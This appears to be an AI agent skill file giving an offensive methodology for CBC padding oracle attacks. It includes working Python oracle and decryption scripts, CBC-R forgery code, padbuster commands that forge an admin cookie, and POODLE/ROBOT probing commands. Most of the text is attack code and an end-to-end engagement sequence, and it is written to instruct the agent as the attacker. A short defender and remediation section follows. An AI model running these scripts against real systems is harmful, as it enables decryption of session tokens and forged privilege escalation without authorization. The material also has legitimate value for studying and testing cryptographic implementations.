---
name: offensive-padding-oracle
description: "Dedicated methodology for finding and weaponizing padding and decryption oracles in real-world applications. Focuses on CBC-mode PKCS#7 padding oracle attacks (Vaudenay 2002): how the XOR relationship between adjacent CBC blocks lets you recover plaintext byte-by-byte from a single valid/invalid padding signal, and how the same primitive runs in reverse (CBC-R) to forge ciphertext that decrypts to arbitrary attacker-chosen plaintext for privilege escalation via encrypted cookies, session tokens, ASP.NET __VIEWSTATE, JSF/Mojarra view state, and encrypted URL parameters. Covers oracle identification in the wild through differential responses (distinct HTTP status codes, error strings, response lengths) and timing side channels, verbose crypto stack traces, and MAC-then-encrypt ordering mistakes. Includes step-by-step manual single-block decryption, then automation with padbuster and the python-paddingoracle library and custom requests-based scripts. Extends to transport-level padding oracles via POODLE against SSLv3 CBC and the TLS CBC MAC-padding timing lineage (Lucky Thirteen). Points to adjacent decryption oracles — Bleichenbacher RSA PKCS#1 v1.5 / ROBOT and AES-GCM nonce-reuse forgery — with remediation toward authenticated encryption (AES-GCM, ChaCha20-Poly1305, encrypt-then-MAC), constant-time padding validation, and uniform error handling. Use when you encounter encrypted blobs, cookies, view-states, or tokens and need to decrypt or forge them without the key. Maps to CWE-209 (Information Exposure Through an Error Message) and CWE-347 (Improper Verification of Cryptographic Signature). Complementary to offensive-crypto-attacks — this skill is the deep dive on the padding/decryption-oracle surface specifically."
---

# Padding & Decryption Oracle Attacks

You are attacking the gap between "the server can decrypt this" and "the server will tell me whether the decryption was well-formed." A padding oracle is any system that leaks a single bit — padding valid, or padding invalid — after decrypting attacker-supplied ciphertext. That one bit is catastrophic: it lets you recover every byte of plaintext and forge ciphertext for arbitrary plaintext, all without ever learning the key. This skill is the dedicated deep dive on padding and decryption oracles. For the broader survey of cryptographic implementation flaws (ECB manipulation, hash length extension, RSA parameter attacks, weak PRNGs), see `offensive-crypto-attacks`; here you go end-to-end on the oracle surface only.

The core insight is structural, not mathematical. CBC decryption XORs each decrypted block with the previous ciphertext block. You control the previous ciphertext block. So by flipping bytes in a block you control and watching whether padding stays valid, you solve for the cipher's intermediate state one byte at a time — and from the intermediate state, both the plaintext and a forgery primitive fall out for free.

## Quick Workflow

1. Inventory every encrypted blob the application round-trips: cookies, session tokens, `__VIEWSTATE`, JSF view state, password-reset tokens, encrypted URL/query parameters, API message bodies, download tickets.
2. Fingerprint the ciphertext: decode Base64/Base64url/hex, measure length, confirm it is a multiple of 8 (DES/3DES) or 16 (AES), and infer whether an IV is prepended.
3. Build the oracle: submit tampered ciphertext and classify the response into exactly two buckets — "padding OK" vs "padding bad" — using status code, error string, response length, redirect, or response time.
4. Confirm the oracle is real: verify that corrupting the second-to-last byte of the penultimate block changes the verdict, and that a clean last byte guess is stable.
5. Decrypt one block manually to prove the oracle, then automate full decryption with padbuster or python-paddingoracle.
6. If the goal is privilege escalation, pivot from decryption to CBC-R encryption: forge a ciphertext that decrypts to the plaintext you want (e.g. `user=admin`).
7. Document root cause (unauthenticated CBC, distinguishable errors) and the remediation path to authenticated encryption.

---

## CBC Padding Oracle Theory

CBC (Cipher Block Chaining) decryption of block `C_i` is:

```
P_i = D_K(C_i) XOR C_{i-1}
```

where `D_K` is the raw block-cipher decryption and `C_{i-1}` is the previous ciphertext block (for the first block, `C_{i-1}` is the IV). Call `I_i = D_K(C_i)` the **intermediate state** — it depends only on the key and `C_i`, so it is fixed no matter what you put in front of it. That is the whole game: if you can learn `I_i`, then `P_i = I_i XOR C_{i-1}` for the *real* previous block, and you have decrypted the block.

PKCS#7 padding appends `N` bytes each of value `N` so the plaintext fills the final block (a full trailing block `10 10 ... 10` is added when the plaintext is already block-aligned). On decryption the server checks the last byte `N`, then checks that the final `N` bytes all equal `N`. A padding oracle answers the question: *after decrypting, was that trailing structure valid?*

To recover the last byte of `I_i`, you replace the previous block with a block `C'` you fully control and ask the oracle about `C' || C_i`. The server computes `P' = I_i XOR C'`. You brute-force `C'[15]` (0..255). When padding becomes valid, the overwhelmingly likely reason is that the last decrypted byte is `0x01`:

```
P'[15] = I_i[15] XOR C'[15] = 0x01   =>   I_i[15] = C'[15] XOR 0x01
```

Now you know `I_i[15]`. To get `I_i[14]`, you set `C'[15]` so the last plaintext byte becomes `0x02` (`C'[15] = I_i[15] XOR 0x02`), then brute-force `C'[14]` until padding is valid again, which means `P'[14] = 0x02`, giving `I_i[14] = C'[14] XOR 0x02`. Repeat down to byte 0. Once the full `I_i` is known:

```
P_i = I_i XOR C_{i-1}        # the real previous ciphertext block
```

You decrypt every block this way (IV needed only to decrypt the very first block). The one caveat is the last byte's ambiguity: a "valid padding" hit on the last byte could coincidentally be `0x02 0x02`, `0x03 0x03 0x03`, etc. Disambiguate by flipping `C'[14]` and re-querying — a true `0x01` is insensitive to the byte before it, a false `0x02` match is not.

### Forging ciphertext (CBC-R)

The intermediate state also gives you encryption without the key. To make block `C_i` decrypt to a plaintext of your choice `P_target`, pick the previous block as:

```
C_{i-1} = I_i XOR P_target
```

Chaining this backwards from a final padded block lets you construct an entire ciphertext (and matching IV) that decrypts to arbitrary content — the basis for forging an `admin` cookie or a malicious serialized view state. You need `I_i` for each block you emit, which you obtain from the same oracle (any valid ciphertext block works as a "target" block to learn its intermediate state).

---

## Identifying Oracles in the Wild

The hard part is rarely the math — it is reliably classifying the response into two buckets. Look for these signals.

Distinct HTTP status or redirect behavior between a decrypt failure and a logic failure:

```http
GET /account?token=Rk9PYkFSYmF6cXV4MTIzNDU2Nzg5MA%3D%3D HTTP/1.1
Host: example.com

HTTP/1.1 500 Internal Server Error        # padding error (unhandled crypto exception)

HTTP/1.1 200 OK                            # padding OK, then app-level "invalid token"
HTTP/1.1 302 Found  Location: /login       # padding OK, token rejected downstream
```

Verbose crypto errors are a dead giveaway and also satisfy CWE-209:

```
javax.crypto.BadPaddingException: Given final block not properly padded
System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.
ValueError: Padding is incorrect.
error:1e06d065:Cipher functions:EVP_DecryptFinal_ex:bad decrypt
```

Response-length differentials when the error page differs by even a few bytes. Diff the body length of a known-bad vs a plausibly-good ciphertext.

Timing differentials when the padding check short-circuits before an expensive downstream operation (DB lookup, MAC verify). If the fast path is "reject on bad padding," a valid-padding response is measurably slower. Use many samples and compare medians:

```python
import requests, statistics, time

def classify_by_timing(url, token, samples=30):
    times = []
    for _ in range(samples):
        t0 = time.perf_counter_ns()
        requests.get(url, params={"token": token})
        times.append(time.perf_counter_ns() - t0)
    return statistics.median(times)
```

High-value targets that are almost always CBC-encrypted blobs:

| Target | Where it lives | Why it is often oracle-prone |
|---|---|---|
| Session/auth cookie | `Cookie:` header | Home-rolled CBC without a MAC |
| ASP.NET `__VIEWSTATE` | POST body | Legacy MAC-disabled or CVE-2017-9822-style handling |
| JSF/Mojarra view state | `javax.faces.ViewState` | CVE-2013-5855-era CBC view state |
| Password-reset token | URL query param | Encrypted user ID, verbose decrypt error |
| Encrypted URL parameter | Query string | "Tamper-proof" IDs that are just CBC |
| Download/entitlement ticket | Query or cookie | CBC ticket validated before use |

---

## Manual Single-Block Decryption

Prove the oracle by hand before automating — it catches encoding mistakes and false oracles. This script decrypts one block (`C_i`) given the preceding block (`C_prev`) using a boolean `oracle()` you adapt to the target.

```python
import requests

BLOCK = 16

def oracle(crafted_prev: bytes, target_block: bytes) -> bool:
    """Return True iff the server reports VALID padding.
    Adapt the transport/encoding and the success test to your target."""
    blob = (crafted_prev + target_block).hex()
    r = requests.get("https://example.com/account", params={"token": blob})
    # Example classifier: 500 == bad padding, anything else == padding OK
    return r.status_code != 500

def recover_intermediate(target_block: bytes) -> bytearray:
    """Recover I = D_K(target_block), one byte at a time, high index to low."""
    inter = bytearray(BLOCK)
    for pos in range(BLOCK - 1, -1, -1):
        pad = BLOCK - pos
        prefix = bytes(BLOCK - pos - 1)           # don't-care bytes before pos
        found = False
        for guess in range(256):
            crafted = bytearray(prefix) + bytearray([guess])
            # set already-known bytes to produce the current pad value
            for k in range(pos + 1, BLOCK):
                crafted.append(inter[k] ^ pad)
            if oracle(bytes(crafted), target_block):
                # disambiguate the last byte: perturb the neighbor and re-test
                if pos == BLOCK - 1:
                    probe = bytearray(crafted)
                    probe[pos - 1] ^= 0xFF
                    if not oracle(bytes(probe), target_block):
                        continue
                inter[pos] = guess ^ pad
                found = True
                break
        if not found:
            raise RuntimeError(f"no valid padding at position {pos}")
    return inter

def decrypt_block(c_prev: bytes, c_i: bytes) -> bytes:
    inter = recover_intermediate(c_i)
    return bytes(a ^ b for a, b in zip(inter, c_prev))
```

Walkthrough for the last byte, concretely: you send `C' || C_i`, sweep `C'[15]` from `0x00` to `0xFF`, and the server returns "valid" when `D_K(C_i)[15] XOR C'[15] == 0x01`. If `C'[15] = 0x3D` produced the hit, then `I_i[15] = 0x3D XOR 0x01 = 0x3C`. To attack byte 14 you now fix `C'[15] = I_i[15] XOR 0x02 = 0x3E` (forcing the last plaintext byte to `0x02`) and sweep `C'[14]` for the next "valid" verdict.

Forge a block with CBC-R once you have the intermediate state:

```python
def forge_prev_block(target_block: bytes, desired_plaintext: bytes) -> bytes:
    """Return the C_{i-1} that makes target_block decrypt to desired_plaintext."""
    assert len(desired_plaintext) == BLOCK
    inter = recover_intermediate(target_block)
    return bytes(a ^ b for a, b in zip(inter, desired_plaintext))
```

---

## Full Automation

### padbuster

padbuster is the canonical automated CBC padding oracle tool. Point it at the request, tell it the Base64/hex encoding and the block size, and let it brute the oracle.

```bash
# Decrypt a URL-encoded, Base64 (encoding 0) cookie value.
# Positional args: URL, encrypted sample, block size.
padbuster https://example.com/account EncryptedSampleHere 16 \
  -cookies "auth=EncryptedSampleHere" \
  -encoding 0

# When padbuster cannot auto-detect the error signature, pin it explicitly.
padbuster https://example.com/account EncryptedSampleHere 16 \
  -cookies "auth=EncryptedSampleHere" \
  -encoding 0 \
  -error "Padding is invalid"

# Forge ciphertext that decrypts to attacker-chosen plaintext (-plaintext).
padbuster https://example.com/account EncryptedSampleHere 16 \
  -cookies "auth=EncryptedSampleHere" \
  -encoding 0 \
  -plaintext "user=admin;role=root"
```

Encoding flags worth memorizing: `0` = Base64, `1` = lowercase hex, `2` = uppercase hex, `3` = `.NET` UrlToken, `4` = Base64url (web-safe). If the sample itself contains an IV, add `-noiv` only when the IV is *not* part of the sample; otherwise let padbuster treat the first block as the IV.

### python-paddingoracle

For non-HTTP transports or awkward encodings, the `python-paddingoracle` library lets you express the oracle as a Python method and raise a known exception on bad padding.

```python
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests

class Oracle(PaddingOracle):
    def oracle(self, data, **kwargs):
        token = b64encode(data).decode()
        r = requests.get("https://example.com/account",
                         cookies={"auth": token})
        if "Padding is invalid" in r.text or r.status_code == 500:
            raise BadPaddingException   # tells the engine: padding was bad
        # returning normally == padding accepted

if __name__ == "__main__":
    ct = b64decode(b"EncryptedSampleHere==")
    o = Oracle()
    recovered = o.decrypt(ct, block_size=16, iv=bytes(16))
    print("Recovered:", recovered)

    # Encrypt arbitrary plaintext (CBC-R forgery) through the same oracle.
    forged = o.encrypt(b"user=admin;role=root", block_size=16)
    print("Forged ciphertext:", b64encode(forged).decode())
```

### Self-contained requests-based driver

When you want full control over classification (e.g. combine status + length + timing), drive it yourself:

```python
import requests
from base64 import urlsafe_b64encode as b64u, urlsafe_b64decode as unb64u

BLOCK = 16
URL = "https://example.com/view"

def oracle(blob: bytes) -> bool:
    r = requests.post(URL, data={"state": b64u(blob).decode()})
    return "BadPadding" not in r.text and r.status_code < 500

def recover_intermediate(block: bytes) -> bytes:
    inter = bytearray(BLOCK)
    for pos in range(BLOCK - 1, -1, -1):
        pad = BLOCK - pos
        craft = bytearray(BLOCK)
        for k in range(pos + 1, BLOCK):
            craft[k] = inter[k] ^ pad
        for g in range(256):
            craft[pos] = g
            if oracle(bytes(craft) + block):
                if pos == BLOCK - 1:
                    craft[pos - 1] ^= 0xFF
                    if not oracle(bytes(craft) + block):
                        continue
                inter[pos] = g ^ pad
                break
    return bytes(inter)

def decrypt(ciphertext: bytes, iv: bytes) -> bytes:
    blocks = [iv] + [ciphertext[i:i+BLOCK] for i in range(0, len(ciphertext), BLOCK)]
    out = b""
    for i in range(1, len(blocks)):
        inter = recover_intermediate(blocks[i])
        out += bytes(a ^ b for a, b in zip(inter, blocks[i-1]))
    return out
```

Tuning notes: thread the 256-value sweep for speed, but keep per-byte requests ordered; add jitter/backoff to avoid rate limits; and cache intermediate states so a forgery run reuses what decryption already learned. A full AES block is at most 256 requests per byte, so ~4096 worst-case per block — usually far fewer.

---

## POODLE: A Transport-Level Padding Oracle

POODLE (Padding Oracle On Downgraded Legacy Encryption, CVE-2014-3566) is the same primitive at the TLS layer. SSLv3 CBC cipher suites do not specify the content of padding bytes — only the final length byte is checked — so a MITM can replace the last block of a record with an earlier ciphertext block and learn one byte of plaintext whenever the record is accepted. With ~256 requests per byte, an active attacker recovers secrets like session cookies from an SSLv3 session.

The attack requires a protocol downgrade to SSLv3, which is why TLS_FALLBACK_SCSV and disabling SSLv3 outright are the fixes. Enumerate exposure:

```bash
# Confirm the server still negotiates SSLv3 with a CBC suite.
openssl s_client -connect example.com:443 -ssl3

# Broad scan including the POODLE check.
nmap --script ssl-poodle -p 443 example.com

# testssl.ly flags POODLE-SSLv3 and the rarer POODLE-TLS variants.
testssl.sh --poodle https://example.com
```

A related (but distinct) lineage is Lucky Thirteen (CVE-2013-0169), a timing padding oracle against TLS CBC's MAC-then-pad-then-encrypt construction — recovery comes from timing the MAC computation rather than a clean valid/invalid bit. Treat any CBC cipher suite as suspect and prefer AEAD suites (`TLS_AES_128_GCM_SHA256`, ChaCha20-Poly1305).

---

## Adjacent Decryption Oracles

Padding oracles are one species of a broader family: any decryption that leaks structure validity. Two others you will meet in the field — covered in depth in `offensive-crypto-attacks`, summarized here so you recognize them.

**Bleichenbacher / ROBOT (RSA PKCS#1 v1.5).** When a TLS server (or any RSA decryptor) distinguishes valid from invalid PKCS#1 v1.5 padding after RSA decryption, it is an oracle for adaptive chosen-ciphertext recovery of the RSA-encrypted value — classically the TLS premaster secret, enabling passive session decryption or signature forgery. ROBOT (2017) showed F5, Citrix, Cisco, and others still vulnerable 19 years after Bleichenbacher 1998. The signal is the same idea as padding oracles: a distinguishable response (alert type, connection reset, or timing) tied to padding validity.

```bash
# Test a host for the Bleichenbacher/ROBOT oracle.
python robot-detect.py --quiet example.com

# testssl.sh also reports ROBOT.
testssl.sh --robot https://example.com
```

**AES-GCM nonce reuse.** GCM is AEAD, so it has no padding — but reusing a (key, nonce) pair leaks the GHASH authentication key `H`, which turns into a forgery oracle: once you recover `H` you can forge valid authentication tags for arbitrary ciphertext, defeating integrity entirely. Capture two messages sharing a nonce, solve the resulting polynomial over GF(2^128) for `H` (SageMath or a dedicated library), then forge. Detection is simply watching for repeated nonces across captured records. This is a *forgery* oracle rather than a decryption oracle, but it belongs in the same mental bucket: a structural leak that breaks the construction without touching the primitive.

---

## Detection / Defender View

What defenders observe when a padding oracle is being exploited, and how they shut it down.

- **Sequential single-byte tampering.** Hundreds to thousands of requests to one endpoint where the same encrypted parameter changes by one byte per request, walking through 0x00–0xFF at a fixed offset. This is the dominant IOC. Alert on any endpoint that returns a binary pass/fail for an encrypted input and sees high-volume near-identical requests.
- **Error-rate spikes on decrypt paths.** Bursts of `BadPaddingException` / `CryptographicException` in application logs, or 500s clustered on a token/view-state endpoint.
- **Timing-probe patterns.** High-concurrency, low-variance request storms against a decrypt endpoint, consistent with median-timing measurement.
- **SSLv3 / CBC negotiation.** TLS handshakes negotiating SSLv3 or legacy CBC suites, or TLS_FALLBACK_SCSV downgrade attempts — POODLE/Lucky Thirteen surface.

Remediation, in priority order:

- **Use authenticated encryption.** Move from unauthenticated CBC to an AEAD mode — AES-GCM, AES-GCM-SIV, or ChaCha20-Poly1305. The decryptor rejects tampered ciphertext before any padding logic runs, so there is no padding bit to leak.
- **If CBC must stay, encrypt-then-MAC.** Compute a MAC (HMAC) over the IV+ciphertext and verify it in constant time *before* decrypting. A failed MAC means you never reach the padding check. MAC-then-encrypt and encrypt-and-MAC are both exploitable orderings — this is a CWE-347 (improper signature/MAC verification) failure.
- **Constant-time, uniform error handling.** Never branch observably on padding validity. Return one generic error, with the same status code, body length, and latency, for every decryption failure (CWE-209). Do not surface crypto stack traces to clients.
- **Disable SSLv3 and CBC-only suites.** Enforce TLS 1.2+ with AEAD suites and TLS_FALLBACK_SCSV to kill POODLE; patch RSA stacks and prefer PSS/OAEP or ECDHE key exchange to close Bleichenbacher/ROBOT.

---

## Engagement Cheatsheet

| Target | Tool / Technique | First Step |
|---|---|---|
| Encrypted cookie (CBC) | padbuster `-cookies` | Flip last byte of penultimate block, diff response |
| Encrypted URL param | python-paddingoracle | Decode, confirm length % 16 == 0, build classifier |
| ASP.NET `__VIEWSTATE` | padbuster / custom | Check for MAC; test decrypt-error differential |
| JSF `ViewState` | custom requests driver | Base64url decode, classify 500 vs 200 |
| Forge admin token | CBC-R (`-plaintext`) | Learn one block's intermediate, chain backwards |
| SSLv3 endpoint | `nmap --script ssl-poodle` | Confirm SSLv3+CBC negotiation |
| TLS RSA key exchange | `robot-detect.py` | Check PKCS#1 v1.5 padding distinguishability |

Ciphertext triage before you commit:

- Length is a multiple of 16 and non-constant per value: likely AES-CBC/ECB — candidate for the oracle.
- Length is plaintext length + 16 (or +28 with a 12-byte nonce): likely AES-GCM — no padding oracle; look for nonce reuse instead.
- First 16 bytes look random and change every issuance: probably a prepended IV — feed it as the IV, not as data.
- Decodes cleanly from Base64url but not standard Base64: set encoding `4` in padbuster.

End-to-end sequence:

```bash
# 1. Grab a valid token and confirm block alignment.
echo -n 'EncryptedSampleHere' | base64 -d | wc -c   # multiple of 16?

# 2. Prove the oracle: tamper one byte, compare responses.
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
  "https://example.com/account?token=TAMPERED"

# 3. Decrypt automatically.
padbuster https://example.com/account EncryptedSampleHere 16 \
  -cookies "auth=EncryptedSampleHere" -encoding 0

# 4. Forge the privilege you want.
padbuster https://example.com/account EncryptedSampleHere 16 \
  -cookies "auth=EncryptedSampleHere" -encoding 0 \
  -plaintext "user=admin;role=root"
```

---

## Key References

- Vaudenay, S. "Security Flaws Induced by CBC Padding — Applications to SSL, IPSEC, WTLS..." EUROCRYPT 2002. (Original padding oracle attack.)
- Duong, T. and Rizzo, J. "Practical Padding Oracle Attacks." USENIX WOOT 2010. (ASP.NET / web exploitation, CBC-R forgery.)
- Möller, B., Duong, T., Kotowicz, K. "This POODLE Bites: Exploiting the SSL 3.0 Fallback." 2014. (POODLE; CVE-2014-3566.)
- AlFardan, N. and Paterson, K. "Lucky Thirteen: Breaking the TLS and DTLS Record Protocols." IEEE S&P 2013. (CVE-2013-0169 timing padding oracle.)
- Böck, H., Somorovsky, J., Young, C. "Return Of Bleichenbacher's Oracle Threat (ROBOT)." USENIX Security 2018. https://robotattack.org
- Bleichenbacher, D. "Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS#1." CRYPTO 1998.
- Joux, A. "Authentication Failures in NIST version of GCM." NIST Comment, 2006. (GCM nonce reuse forgery.)
- CWE-209: Generation of Error Message Containing Sensitive Information.
- CWE-347: Improper Verification of Cryptographic Signature.
- OWASP Cryptographic Storage Cheat Sheet (authenticated encryption, encrypt-then-MAC).
- padbuster: https://github.com/AonCyberLabs/PadBuster
- python-paddingoracle: https://github.com/mwielgoszewski/python-paddingoracle
- ROBOT detection tool: https://github.com/robotattackorg/robot-detect
- testssl.sh: https://github.com/drwetter/testssl.sh
